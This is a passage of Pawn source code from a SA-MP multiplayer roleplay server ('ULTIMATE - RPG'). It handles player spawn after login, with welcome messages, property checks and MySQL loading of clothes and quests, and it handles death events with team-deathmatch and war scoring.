        if( PlayerLogged[ playerid ] == true )
		{
			ApplyAnimation(playerid, "SWEET", "null", 0.0, 0, 0, 0, 0, 0);
			KillTimer(LoginTime[playerid]);
			ClearChat(playerid, 20);

			new h, mi, sec;
			gettimeEx(h, mi, sec);
			FixHour( h );
			h = shifthour;
			StopAudioStreamForPlayer( playerid );

			new q[ 100 ];
    		mysql_format( mSQL, q, sizeof( q ), "SELECT * FROM `vehicles` WHERE `owner_sqlID` = '%d' AND `v_usage` = '1'", PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q, "OnPlayerVehiclesLoad", "i", playerid );

			//-----------------
			SendClientMessage(playerid, 0x4282C0FF, "______________________________________________________________");
			SendClientMessage(playerid, -1, " ");
            SCMF( playerid, 0x4282C0FF, "> Pozdrav {FFFFFF}%s, {4282C0}dobrodosli nazad na {FFFFFF}ULTIMATE - RPG.", ImeIgraca( playerid ) );
			SendClientMessage( playerid, 0x4282C0FF, "> Forum: {FFFFFF}"SERVER_WEB"");
			SendClientMessage( playerid, 0x4282C0FF, "> Instagram: {FFFFFF}@ULTIMATE_RPG");
            SCMF( playerid, 0x4282C0FF, "> Level: {FFFFFF}(%s) {4282C0}| Novac: {FFFFFF}($%s)", fNumber(PlayerInfo[playerid][xLevel]), fNumber(GetPlayerMoney(playerid)+PlayerInfo[playerid][xBRacun]));
			SCMF( playerid, 0x4282C0FF, "> Organizacija: {FFFFFF}%s {4282C0}| Posao: {FFFFFF}%s", getOrgName( PlayerInfo[ playerid ][ xClan ] ), getJobName( PlayerInfo[ playerid ][ xPosao ] ) );

			if( ServerInfo[ HappyHours ] != 0 && ServerInfo[ HappyJobs ] != 0 ) SendClientMessage( playerid, 0x4282C0FF, "> Trenutno su na serveru ukljuceni {FFFFFF}'srecni sati' {4282C0}i {FFFFFF}'srecni poslovi'." );
			else if( ServerInfo[ HappyHours ] != 0 ) SendClientMessage( playerid, 0x4282C0FF, "> Trenutno su na serveru ukljuceni {FFFFFF}'srecni sati'." );
			else if( ServerInfo[ HappyJobs ] != 0 ) SendClientMessage( playerid, 0x4282C0FF, "> Trenutno su na serveru ukljuceni {FFFFFF}'srecni poslovi'." );
			SendClientMessage(playerid, 0x4282C0FF, "______________________________________________________________");
			SendClientMessage(playerid, -1, " ");

			if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
			{
   				SCMF( playerid, 0x4282C0FF, "(U): Logira%s si kao {FFFFFF}%s.", PlayerInfo[playerid][xPol] == 1 ? "n" : "na", getAdminRankName( playerid ) );
			    DodajWarnRed("~r~(CONNECT - %s): %s ~w~je usa%s na server.", getAdminRankName( playerid ), ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );

	    		ALTPoruke[playerid] = true;
			}
			else if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
			{
   				SCMF(playerid, 0x4282C0FF, "(U): Logira%s si kao {FFFFFF}'Spec Admin'.", PlayerInfo[playerid][xPol] == 1 ? "n" : "na"); 
			    DodajWarnRed("~b~(CONNECT - Spec Admin): %s ~w~je usa%s na server.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );

	    		ALTPoruke[playerid] = true;
			}
			else if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
			{
		    	SCMF( playerid, 0x4282C0FF, "(U): Logira%s si kao {FFFFFF}GameMaster - %d.", PlayerInfo[playerid][xPol] == 1 ? "n" : "na", PlayerInfo[ playerid ][ xGamemaster ] );
                DodajWarnRed("~g~(CONNECT - GM|%d): %s ~w~je usa%s na server.", PlayerInfo[playerid][xGamemaster], ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la");
			}

			//-----------------

			if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 )
			{
			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iOwner ], ImeIgraca( playerid ), true ) )
				{
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Imovina 1 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Jedan od razloga moze biti i vasa neaktivnost od 500h." );
			        PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
			        PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = 0;

					sql_user_update_integer( playerid, "property_id_1", PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] );
			    }
			}
			if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) 
			{
			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iOwner ], ImeIgraca( playerid ), true ) )
			    {
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Imovina 2 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Jedan od razloga moze biti i vasa neaktivnost od 500h." );
			        PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
			        PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = 0;

					sql_user_update_integer( playerid, "property_id_2", PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] );
			    }
			}
			if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 )
			{
			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iOwner ], ImeIgraca( playerid ), true ) )
			    {
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Imovina 3 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Jedan od razloga moze biti i vasa neaktivnost od 500h." );
			        PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
			        PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = 0;

					sql_user_update_integer( playerid, "property_id_3", PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] );
			    }
			}
			if( PlayerInfo[ playerid ][ xFirmaID ] != -1 )
			{
			    if( strcmp( BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bOwner ], ImeIgraca( playerid ), true ) )
			    {
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Firma vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    SendClientMessage( playerid, ANTICHEAT, "(SERVER): Jedan od razloga moze biti i vasa neaktivnost od 500h ili nedostatak faktura." );
					PlayerInfo[ playerid ][ xFirmaID ] = -1;
					PlayerInfo[ playerid ][ xBussinesSqlID ] = 0;

					sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
			    }
			}

			if( PlayerInfo[ playerid ][ xWanted ] != 0 )
			{
				SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
				strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nepoznato", 0, strlen( "Nepoznato" ), 255);
				strmid( ZlocinInfo[ playerid ][ zPocinio ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
				strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nepoznato", 0, strlen( "Nepoznato" ), 255);
			}

			#if XMAS_MOD == 1

				SendClientMessage( playerid, 0x4282C0FF, "(U): Zelimo svima srecne Bozicne i novogodisnje praznike - Happy New Year *** 2020 ***");
				SendClientMessage( playerid, 0x4282C0FF, "(U): Povodom praznika {FFFFFF}ULTIMATE - RPG {4282C0}vam daje vredne poklone {FFFFFF}\"/novagodina\"");
			
			#endif

			#if ZIMSKI_MOD == 1

				SendClientMessage(playerid, 0x4282C0FF, "(U): Uzivajte u zimskoj idili, upisite {FFFFFF}\"/sneg\"");

			#endif

			fLoadIpsByName( playerid );

			if(PlayerInfo[playerid][xClan] != 0) 
			{
				foreach(new i : Player) 
				{
					if(PlayerInfo[playerid][xClan] == PlayerInfo[i][xClan] && playerid != i) SCMF(i, 0xFF0000FF, "* ORG: {FFFFFF}Clan vase organizacije {FF0000}%s(%d) {FFFFFF}je usao na server.", ImeIgraca(playerid), playerid);
				}
			}

			SetPlayerTimerEx(playerid, "Player_OneSecond", 1000, true, "i", playerid);
		}
        first_spawn[ playerid ] = false;
	}

	static q[128];
	if( clothes_load[ playerid ] )
	{
		mysql_format(mSQL, q, sizeof(q), "SELECT * FROM `user_clothes` WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xID ] );
		mysql_tquery(mSQL, q, "OnClothesLoad", "i", playerid);
		clothes_load[ playerid ] = false;
	}

	if(quests_load[playerid])
	{
		mysql_format(mSQL, q, sizeof(q), "SELECT * FROM `quests` WHERE `user_id`='%d' LIMIT 1", PlayerInfo[playerid][xID]);
		mysql_tquery(mSQL, q, "checkPlayerQuests", "i", playerid);
	}

	if(skills_load[playerid])
	{
		mysql_format(mSQL, q, sizeof(q), "SELECT * FROM `job_skills` WHERE `user_id`='%d' LIMIT 1", PlayerInfo[playerid][xID]);
		mysql_tquery(mSQL, q, "checkPlayerJobSkills", "i", playerid);
	}

	switch(PlayerInfo[ playerid ][ xBStil ])
	{
    	case 0: SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
		case 1: SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
		case 2: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
		case 3: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
		case 4: SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
	}

    SetPlayerSkillLevel( playerid, WEAPONSKILL_DESERT_EAGLE, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_MP5, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_AK47, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_M4, 999 );

	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_6 );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_7 );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_8 );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_9 );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );

	for( new i = 0; i < 4; i++ )
	{
	    if( object_on_player[ playerid ][ i ] )
		{
	        switch( i )
			{
				case 0:
				{
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, clothes_info[ playerid ][ x_slot_1_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_1_model ]),
																		clothes_info[ playerid ][ x_slot_1_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_1_pos ][ 8 ], 0, 0);
				}
				case 1:
				{
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, clothes_info[ playerid ][ x_slot_2_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_2_model ]),
																		clothes_info[ playerid ][ x_slot_2_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_2_pos ][ 8 ], 0, 0);
				}
				case 2:
				{
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, clothes_info[ playerid ][ x_slot_3_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_3_model ]),
																		clothes_info[ playerid ][ x_slot_3_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_3_pos ][ 8 ], 0, 0);
				}
				case 3:
				{
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, clothes_info[ playerid ][ x_slot_4_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_4_model ]),
																		clothes_info[ playerid ][ x_slot_4_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 7 ],
			  															clothes_info[ playerid ][ x_slot_4_pos ][ 8 ], 0, 0);
				}
			}
	    }

	}

	PlayerCuffed[ playerid ] = 0;
	PoliceDuty[ playerid ] = false;
	NosiPaketOruzja[ playerid ] = false;
	LaptopRuke[ playerid ] = false;
	IgracZavezan[ playerid ] = false;

    if(as_Buying[playerid] == true)
	{
 	    as_Buying[playerid] = false;
 	    ControlTextDrawVehBuy(playerid, false);
		TogPlayerHud(playerid);
	}

	SetPlayerSkillLevel( playerid, WEAPONSKILL_PISTOL, 999 );
    SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );

    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );

	KillTimer(_progressatmbar[playerid]);

    if( PlayerInfo[ playerid ][ xZatvor ] == JAIL )
	{
		if( PlayerInfo[ playerid ][ xLeaveJail ] == 1 )
		{
		    SCMF( playerid, 0x4282C0FF, "#JAIL: {FFFFFF}Stavljeni ste u jail na {4282C0}(%d) {FFFFFF}minuta. | Razlog: {4282C0}WL Disconnect", PlayerInfo[ playerid ][ xZatvorVreme ]);
		    PlayerInfo[ playerid ][ xLeaveJail ] = 0;
		}
	}
	if( PlayerInfo[ playerid ][ xZatvor ] == JAIL )
	{
		if( strlen( PlayerInfo[ playerid ][ xOffPJail ] ) > 2 )
		{
		    SCMF( playerid, 0x4282C0FF, "#OFF-JAIL: {FFFFFF}Stavljeni ste u jail na {4282C0}(%d) {FFFFFF}minuta. | Razlog: {4282C0}%s", PlayerInfo[ playerid ][ xZatvorVreme ], PlayerInfo[ playerid ][ xOffPJail ] );
			strmid( PlayerInfo[ playerid ][ xOffPJail ], "N", 0, strlen("N"), 2 );
			sql_user_update_string( playerid, "offpjail", PlayerInfo[ playerid ][ xOffPJail ] );
		}
	}
	if( PlayerInfo[ playerid ][ xZatvor ] == PRISON )
	{
		if( strlen( PlayerInfo[ playerid ][ xOffPPrison ] ) > 2 )
		{
		    SCMF( playerid, 0x4282C0FF, "#OFF-PRISON: {FFFFFF}Stavljeni ste u prison na {4282C0}(%d) {FFFFFF}sata. | Razlog: {4282C0}%s", PlayerInfo[ playerid ][ xZatvorVreme ]/60, PlayerInfo[ playerid ][ xOffPPrison ] );
			strmid( PlayerInfo[ playerid ][ xOffPPrison ], "N", 0, strlen("N"), 2 );
			sql_user_update_string( playerid, "offpprison", PlayerInfo[ playerid ][ xOffPPrison ] );
		}
	}
	if( gettime() < PlayerInfo[ playerid ][ xMute ] )
	{
		if( strlen( PlayerInfo[ playerid ][ xOffPMute ] ) > 2 )
		{
		    SCMF( playerid, 0x4282C0FF, "#OFF-MUTE: {FFFFFF}Mutirani ste na {4282C0}%d {FFFFFF}minuta. | Razlog: {4282C0}%s", PlayerInfo[ playerid ][ xMute ] - gettime(), PlayerInfo[ playerid ][ xOffPMute ] );
			strmid( PlayerInfo[ playerid ][ xOffPMute ], "N", 0, strlen("N"), 2 );
			sql_user_update_string( playerid, "offpmute", PlayerInfo[ playerid ][ xOffPMute ] );
		}
	}

	if( SpecPos[ playerid ][ 0 ] != 0.0 && SpecPos[ playerid ][ 1 ] != 0.0 )
	{
	    SMG_SetPlayerPos( playerid, SpecPos[ playerid ][ 0 ], SpecPos[ playerid ][ 1 ],  SpecPos[ playerid ][ 2 ] );
       	SetPlayerVirtualWorld( playerid, SpecVW[ playerid ] );
       	SetPlayerInterior( playerid, SpecInt[ playerid ] );

       	if( (PlayerInfo[ playerid ][ xSpecAdmin ] > 0 || (PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7)) && PlayerInfo[ playerid ][ xPol ] == 1 )
		{
			SMG_SetPlayerSkin( playerid, 294 );
		}
		else if( PlayerInfo[ playerid ][ xGamemaster ] > 0 && PlayerInfo[ playerid ][ xPol ] == 1 )
		{
			SMG_SetPlayerSkin( playerid, 120 );
		}

       	SpecPos[ playerid ][ 0 ] = 0.0;
       	SpecPos[ playerid ][ 1 ] = 0.0;
       	SpecPos[ playerid ][ 2 ] = 0.0;
	}
	SMG_SetPlayerColor( playerid );
	return 1;
}

public OnPlayerEnterDynamicArea(playerid, areaid)
{
	if(areaid == bankaSalter && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 96 && !antiCheatCS[playerid][SpamBanka])
	{
		SendClientMessage(playerid, -1, "* Dobrodosli u Central Bank, LS. (( ukoliko imate upitnik iznad vase glave (ne bukvalno) odgovorite na 'T' sa 'pomoc' ))");
		antiCheatCS[playerid][SpamBanka] = true;
	}

	#if ZIMSKI_MOD == 1
	else if(areaid == Area_Grudvanje && GetPlayerInterior(playerid) == 0 && Spectate[playerid] == -1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		Snow_F[ playerid ] = true;
		Charged[ playerid ] = 0;
		Shoot[ playerid ] = 0;

	    AlreadyShooted[ playerid ] = true;
	    GrudvanjeTimer[playerid] = SetPlayerTimerEx(playerid, "SkiniSnegGrudavnje", 2000, false, "i", playerid);

		SendClientMessage( playerid, 0x6EF83CFF, "(GRUDVANJE): Pristupili ste grudvanju na ulazu u trg.");
		SendClientMessage( playerid, 0x6EF83CFF, "(GRUDVANJE): Tvoj cilj je da pogodis sto vise ljudi, a da oni tebe ne pogode.");
		SendClientMessage( playerid, 0x6EF83CFF, "(GRUDVANJE): Da napravis grudvu pa posle i pogodis nekog koristi {6EF83C}'DESNI KLIK MISA'.");
	}
	else if(areaid == Area_Klizaliste && GetPlayerInterior(playerid) == 0 && Spectate[playerid] == -1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		SMG_SetPlayerSkin( playerid, 99 );
	}
	#endif
	return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	#if ZIMSKI_MOD == 1
	if(areaid == Area_Grudvanje && GetPlayerInterior(playerid) == 0 && Spectate[playerid] == -1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		Snow_F[ playerid ] = false;
		KillTimer(GrudvanjeTimer[playerid]);

		SendClientMessage( playerid, 0x6EF83CFF, "(GRUDVANJE): Izasli ste iz arene za grudvanje." );
	}
	else if(areaid == Area_Klizaliste && GetPlayerInterior(playerid) == 0 && Spectate[playerid] == -1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);
	}
	#endif
	return 1;
}

public OnPlayerDeath( playerid, killerid, reason )
{
	if(killerid != INVALID_PLAYER_ID && WARPInfo[playerid][WARIgrac] < 1 && tdm_player_info[playerid][tdm_Team] == 0 && NaDmEventu[playerid])
	{
		PlayerInfo[playerid][xDeathLastMSG] = gettime()+15;
		PlayerInfo[playerid][xDeathTime] = gettime()+(10*60);
		GetPlayerPos(playerid, PlayerInfo[playerid][xDeathPos][0], PlayerInfo[playerid][xDeathPos][1], PlayerInfo[playerid][xDeathPos][2]);
	}

	new str[ 128 ];
	if(playerid != IPI)
	{
		if( AdminVozilo[ playerid ] != -1 ) VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( AdminVozilo[ playerid ] ), ResetVehicle( AdminVozilo[ playerid ] ), AdminVozilo[ playerid ] = -1;
		if( VipVozilo[ playerid ] != -1 ) VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( VipVozilo[ playerid ] ), ResetVehicle( VipVozilo[ playerid ] ), VipVozilo[ playerid ] = -1;
		if( PromoterVozilo[ playerid ] != -1 ) VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PromoterVozilo[ playerid ] ), ResetVehicle( PromoterVozilo[ playerid ] ), PromoterVozilo[ playerid ] = -1;
		if( YTVozilo[ playerid ] != -1 ) VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( YTVozilo[ playerid ] ), ResetVehicle( YTVozilo[ playerid ] ), YTVozilo[ playerid ] = -1;
		if( PosaoVozilo[ playerid ] != -1 ) VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoVozilo[ playerid ] ), ResetVehicle( PosaoVozilo[ playerid ] ), PosaoVozilo[ playerid ] = -1;
		if( PosaoTrailer[ playerid ] != -1 ) VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoTrailer[ playerid ] ), ResetVehicle( PosaoTrailer[ playerid ] ), PosaoTrailer[ playerid ] = -1;
		if( TrkaVozilo[ playerid ] != -1 ) SMG_DestroyVehicle( TrkaVozilo[ playerid ] ), ResetVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;
		if( RentVozilo[ playerid ] != -1 )
		{
			KillTimer(RentTimer[playerid]);
			VehicleObjectCheck( RentVozilo[ playerid ] ), VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]), ResetVehicle( RentVozilo[ playerid ] ), SMG_DestroyVehicle( RentVozilo[ playerid ] ), RentVozilo[ playerid ] = -1;
		}
	}

	for( new w = 1; w < MAX_WARS; w ++)
	{
	    if( killerid != IPI )
		{
			if( WARInfo[ w ][ WARAktivan ] == true && WARPInfo[ playerid ][ WARIgrac ] == w && WARPInfo[ killerid ][ WARIgrac ] == w )
			{
				WARPInfo[ killerid ][ WARUbistva ]++;
			   	WARPInfo[ playerid ][ WARSmrti ]++;
				if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true && WARPInfo[ killerid ][ WARTim ][ 0 ] == true )
				{
					WARInfo[ w ][ WARTimSkor ][ 0 ] -= 3; 
			        WARPoruka( w, 0x8B008BFF, "(WAR): %s je ubio svog saigraca %s, te je njegov tim dobio -3 poena.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
			        SetWarStatsTD( w );
				}
				if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true && WARPInfo[ killerid ][ WARTim ][ 1 ] == true )
				{
					WARInfo[ w ][ WARTimSkor ][ 1 ] -= 3; 
			        WARPoruka( w, 0x8B008BFF, "(WAR): %s je ubio svog saigraca %s, te je njegov tim dobio -3 poena.", ImeIgraca( killerid ), ImeIgraca( playerid ));
			        SetWarStatsTD( w );
				}
				if( WARPInfo[ killerid ][ WARTim ][ 0 ] == true && WARPInfo[ playerid ][ WARTim ][ 1 ] == true )
				{
			        WARInfo[ w ][ WARTimSkor ][ 0 ]++; 
		           	WARPoruka( w, 0x8B008BFF, "(WAR): %s je ubio protivnika %s.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
			        SetWarStatsTD( w );
				}
				if( WARPInfo[ killerid ][ WARTim ][ 1 ] == true && WARPInfo[ playerid ][ WARTim ][ 0 ] == true )
				{
			        WARInfo[ w ][ WARTimSkor ][ 1 ]++; 
		            WARPoruka( w, 0x8B008BFF, "(WAR): %s je ubio protivnika %s.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
			        SetWarStatsTD( w );
				}
				return 1;
			}
		}
	}

	if( killerid != IPI && tdm_player_info[ playerid ][ tdm_Team ] != 0 && tdm_player_info[ killerid ][ tdm_Team ] != 0 )
	{
	    foreach( new i : Player)
		{
	        if( tdm_player_info[ i ][ tdm_Team ] != 0 )
			{
	    		if( killerid == IPI || killerid == playerid ) SendDeathMessageToPlayer( i, -1, playerid, reason );
				else SendDeathMessageToPlayer( i, killerid, playerid, reason );
			}
		}

	    if( tdm_player_info[ playerid ][ tdm_Team ] == tdm_player_info[ killerid ][ tdm_Team ] )
		{
	        PlayerInfo[ killerid ][ xCSTDMScore ] -= 3;
		    tdm_player_info[ killerid ][ tdm_KillinaROW ] = 0;

		    tdm_player_info[ playerid ][ tdm_Death ]++;
		    tdm_player_info[ playerid ][ tdm_KillinaROW ] = 0;

			format( str, sizeof( str ), "your_score:_%02d", PlayerInfo[ killerid ][ xCSTDMScore ] );
			PlayerTextDrawSetString( killerid, TDMplayerScore_pTD[ killerid ], str );
	    }
	    else if( tdm_player_info[ playerid ][ tdm_Team ] != tdm_player_info[ killerid ][ tdm_Team ] )
		{
			tdm_player_info[ playerid ][ tdm_Death ]++;
		    tdm_player_info[ playerid ][ tdm_KillinaROW ] = 0;

			tdm_player_info[ killerid ][ tdm_Kill ]++;
			PlayerInfo[ killerid ][ xCSTDMScore ]++;
	        tdm_player_info[ killerid ][ tdm_KillinaROW ]++;
		    if( tdm_player_info[ killerid ][ tdm_KillinaROW ] == 2 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ]++;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}DOUBLE KILL.", ImeIgraca( killerid ) );
			}
			else if( tdm_player_info[ killerid ][ tdm_KillinaROW ] == 3 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ] += 2;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}TRIPLE KILL.", ImeIgraca( killerid ) );
			}
			else if( tdm_player_info[ killerid ][ tdm_KillinaROW ] == 4 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ] += 3;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}QUADRA KILL.", ImeIgraca( killerid ) );
			}
			else if( tdm_player_info[ killerid ][ tdm_KillinaROW ] == 5 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ] += 4;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}PENTA KILL.", ImeIgraca( killerid ) );
			}
			else if( tdm_player_info[ killerid ][ tdm_KillinaROW ] == 6 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ] += 5;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}HEXA KILL.", ImeIgraca( killerid ) );
			}
			else if( tdm_player_info[ killerid ][ tdm_KillinaROW ] > 6 )
			{
				PlayerInfo[ killerid ][ xCSTDMScore ] += 6;
		        send_tdm_message( 0xFF0000FF, "* %s {FFFFFF}is on {FF0000}RAMPAGE.", ImeIgraca( killerid ) );
			}

			if( tdm_player_info[ killerid ][ tdm_Team ] == 1 ) tdm_mapInfo[ tdm_ServerMap ][ ctScore ]++;
		    else if( tdm_player_info[ killerid ][ tdm_Team ] == 2 ) tdm_mapInfo[ tdm_ServerMap ][ ttScore ]++;

			format( str, sizeof( str ), "~b~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ] );
			TextDrawSetString( TDM_gTD[ 17 ], str );
			format( str, sizeof( str ), "~r~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ttScore ] );
			TextDrawSetString( TDM_gTD[ 19 ], str );

			format( str, sizeof( str ), "your_score:_%02d", PlayerInfo[ killerid ][ xCSTDMScore ] );
			PlayerTextDrawSetString( killerid, TDMplayerScore_pTD[ killerid ], str );
	    }
	    return 1;
	}

	PlayerInfo[ playerid ][ xSpawned ] = 0;

    if( NaDmEventu[ playerid ] == true )
	{
        if( killerid != IPI && NaDmEventu[ killerid ] == true )
		{
            foreach( new i : Player)
			{
		        if( NaDmEventu[ i ] == true )
				{
		    		if( killerid == IPI || killerid == playerid )
					{
						SendDeathMessageToPlayer( i, -1, playerid, reason );
					}
					else SendDeathMessageToPlayer( i, killerid, playerid, reason );
				}
			}

		    foreach( new i : Player)
			{
				if( NaDmEventu[ i ] == true )
				{
					SCMF( i, 0x8B008BFF, "(CS-DM): %s je ubio %s.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
				}
			}

            PlayerInfo[ killerid ][ xDMEventUbistva ]++;
